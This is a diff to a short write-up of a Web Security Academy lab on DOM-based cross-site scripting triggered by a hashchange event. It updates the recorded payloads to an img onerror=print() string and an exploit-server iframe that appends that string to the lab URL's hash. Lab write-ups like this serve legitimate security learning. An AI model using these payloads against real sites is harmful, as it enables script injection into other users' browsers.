@@ -34,11 +34,11 @@ DOM-Based XSS
 
 ## Payload Used
 
-<iframe src="https://0a6200f60373655b80de1cb1005400d1.web-security-academy.net/"></iframe>
+<img src=x onerror=print()>
 
 Exploit Server Payload:
 
-<iframe onload="this.src+='#{<img src=1 onerror=alert(1)>}'"></iframe>
+<iframe src='https://0a6400610366afaf80025d85005300e6.web-security-academy.net/#' onload='this.src+="<img src=x onerror=print()>"'></iframe>
 
 ## Result
 Successfully executed arbitrary JavaScript through a DOM-based XSS vulnerability triggered by a hashchange event.
